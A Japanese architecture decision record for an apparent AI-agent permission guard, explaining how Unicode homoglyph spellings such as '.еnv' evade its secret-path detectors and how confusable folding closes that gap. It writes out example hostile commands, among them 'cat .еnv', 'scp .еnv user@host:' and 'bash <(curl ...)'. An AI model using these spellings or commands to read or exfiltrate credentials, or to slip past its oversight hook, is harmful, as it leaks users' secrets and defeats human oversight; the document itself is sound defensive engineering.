# ADR 0007 — Unicode homoglyph の畳み込みで機密 path 検出の回避を塞ぐ

## Status

Accepted (2026-07-09).

## Context

機密 path 検出の 2 系統の分類器 — `src/rules/patterns.rs` の `SENSITIVE_PATH`
(Bash 系ルール `sensitive-path-to-network` / `sensitive-bash-read` の source of
truth) と `src/facts/sensitive.rs` の `classify` (file tool 系ルール
`sensitive-read` の source of truth) — はいずれも ASCII case のみ畳む
(`(?i-u:…)`)。このため `.еnv` (`е` = キリル文字 U+0435) のように、ASCII と
同形にレンダリングされる非 ASCII の同形異字 (homoglyph / confusable) で綴った
機密 path が全検出を素通りする。

- `cat .еnv` → `sensitive-bash-read` が発火せず allow。読み出し時点で secret が
  agent transcript に流入する。
- `scp .еnv user@host:` → `sensitive-path-to-network` が発火せず allow。流出。
- `Read { file_path: ".еnv" }` → `sensitive-read` が発火せず allow。

攻撃面はキリル・ギリシャ・全角ラテン等、Unicode 全体に散在する多数の
confusable。ADR 0001 B1 / ADR 0002 B1 (GAP-01) で「規模から本イテレーション
対象外」として明示的に見送られていた唯一のセキュリティ実害系 gap である。

### NFKC ではなく confusables である理由

一見 NFKC (互換性正規化) で解決できそうに見えるが**不適**。NFKC は互換分解で
あり、キリル `е` とラテン `e` のような**スクリプト差 (cross-script confusable)
は畳まない**。全角ラテン `ｅ`→`e` のような互換等価は畳めるが、homoglyph 攻撃の
主力であるキリル/ギリシャ差はそのまま残るため `.еnv` を捕捉できない。正しい
技術は Unicode TR39 の confusables マッピングである。

### 依存追加ではなく手製テーブルである理由

`unicode-security` 等の TR39 実装クレートを追加する手もあるが、本プロジェクトの
**Minimal Dependencies 原則**に反する。confusable は無数に存在するが、実際に
`docs/design/policy-packs.md` §`core.secrets` の機密 shape を綴るのに使える
ASCII 文字は限られる (`.env` / `.ssh` / `id_rsa` / `.npmrc` 等に現れる英数字)。
そこで、その現実的な攻撃面に限定した**手製の静的 confusables テーブル**
(キリル・ギリシャ小文字/大文字 + 全角 ASCII ブロック) で畳む。網羅を優先する
のではなく、「誤検知より漏れ防止を優先」(`false positives preferable to leaking
a credential`) という既存哲学に沿って、悲観的に畳む。

## Decision

新規モジュール `src/facts/homoglyph.rs` に
`pub(crate) fn fold_confusables(token: &str) -> Cow<str>` を追加し、両分類器の
入口で機密判定の**前段**として適用する。

- **ASCII fast path**: `token.is_ascii()` なら `Cow::Borrowed` を返し、
  一切畳み込まない。シェルトークン/パスの大多数は ASCII なので、既存の
  ホットパス・性能特性・挙動は**ビット単位で不変**。非 ASCII バイトを 1 つでも
  含むトークンだけを走査・書き換える。
- **curated テーブル**: キリル (`а`→`a`, `е`→`e`, `о`→`o`, `с`→`c`, `р`→`p`,
  `ѕ`→`s`, `і`→`i`, `к`→`k`, 大文字 `А`→`A` 等) とギリシャ (`ο`→`o`, `ν`→`v`,
  `α`→`a`, `κ`→`k`, `Α`→`A` 等) を静的 `match` で列挙。全角 ASCII 変種ブロック
  (U+FF01..=U+FF5E) は固定オフセット 0xFEE0 の算術で ASCII (0x21..=0x7E) へ
  写像する。
- **通過**: テーブル外の非 ASCII は**そのまま通す** (情報を落とさない)。従って
  curated 表の外にある exotic codepoint (例: Mathematical Sans-Serif の
  `𝖾` U+1D5BE) は依然として検出されず、これは意図した対応範囲の境界として
  `tests/bypass/corpus.jsonl` に `known_gap` で pin する (表を拡張したら
  corpus 側が失敗して更新を強制する)。
- **panic-free**: 任意の Unicode 入力で全域。

### 2 分類器へ同一の畳み込みを入れる (パリティ維持)

`SENSITIVE_PATH` と `classify` の一致は `pbt_sensitive_path_matches_classify`
property で恒久的に縛られている。**片方だけに畳み込みを入れるとパリティが
壊れ、一方の surface だけが homoglyph を捕捉する不整合が生じる**。従って:

- `src/rules/patterns.rs::matches_sensitive_path` — needle gate / regex 判定の
  前に `fold_confusables` を適用。`argv_references_sensitive` 経由で
  `sensitive-path-to-network` / `sensitive-bash-read` に効く。
- `src/facts/sensitive.rs::classify_into` — `needle_mask` の byte 高速路の前に
  `fold_confusables` を適用。`facts.sensitive` 経由で `sensitive-read` に効く。

畳み込みヘルパは `src/facts/homoglyph.rs` に一元化し両者から呼ぶ
(source of truth を 1 つに)。既存の parity property は生成器が ASCII
(`[ -~]{0,80}`) のみなので、ASCII 入力に対する挙動が不変である以上そのまま
通る。非 ASCII に対するパリティは新規 property
`pbt_homoglyph_sensitive_tokens_caught_by_both` で追加検証する。

## Consequences

### Positive

- `.еnv` (キリル)・`．ｅｎｖ` (全角)・ギリシャ交じり等の同形異字で綴った機密
  path が、Bash 単独読み (`ask`)・network 共存 (`deny`)・file tool
  (`deny`) の各経路で ASCII 形と同格に検出される。
- ASCII トークンは `Cow::Borrowed` で畳み込みゼロコスト。既存の性能特性・
  挙動を一切変えない。
- 依存追加なし (Minimal Dependencies 順守)。

### Negative

- curated テーブルは TR39 全体ではないため、表に無い exotic codepoint での
  綴りは依然素通りする (residual gap、下記 Known limitations)。
- 畳み込み後の `SensitivePath.raw` は、非 ASCII 入力時には folded (ASCII) 形の
  substring になる。`raw` は情報用途のみでルール判定は `kind`/非空で行うため
  実害はないが、「非 ASCII 入力時 raw は folded 形」である旨を
  `homoglyph.rs` の doc に明記した。既存 `pbt_match_raw_is_substring` は
  ASCII 生成器なので不変。
- 全角ラテン大文字を畳むと PEM ヘッダ (`-----BEGIN … PRIVATE KEY-----`、
  RFC 7468 で大文字固定) にも作用しうるが、機密検出を強める方向なので許容。

### Known limitations (本イテレーション外)

- curated confusables 表の外にある codepoint (Mathematical Alphanumeric
  Symbols `𝖾` 等、その他 TR39 の残余) は畳まれず検出を素通りする。
  `gap-unicode-homoglyph-uncurated-codepoint` として corpus に pin。表を
  拡張する際はこの `known_gap` の更新を要する。
- cmdsubst (`echo $(cat .env)`)・process-subst (`bash <(curl ...)`)・Bash
  トークン symlink は本 ADR の対象外 (別 gap として `known_gap` 継続)。

## Implementation map

| 項目 | ファイル | 主要変更 |
|---|---|---|
| 畳み込み | `src/facts/homoglyph.rs` (新規) | `fold_confusables` + curated 表、ASCII fast path、panic-free property |
| モジュール宣言 | `src/facts/mod.rs` | `pub mod homoglyph;` |
| Bash 系組み込み | `src/rules/patterns.rs` | `matches_sensitive_path` で判定前に fold |
| file tool 系組み込み | `src/facts/sensitive.rs` | `classify_into` で判定前に fold |
| corpus | `tests/bypass/corpus.jsonl` | `.еnv` を `must_catch`/`ask` へ昇格、scp exfil (deny) / Read (deny) / 全角 (ask) を追加、exotic codepoint を `known_gap` で pin |
| PBT | `src/testing/proptest.rs` | `homoglyph_sensitive_token()` 生成器、`patterns.rs` / `sensitive.rs` に捕捉・パリティ property |
| Doc | `docs/design/policy-packs.md`, ADR 0001/0002, `docs/review/open-issues.md` | homoglyph 畳み込みを追記、B1 (GAP-01) を解消へ更新 |
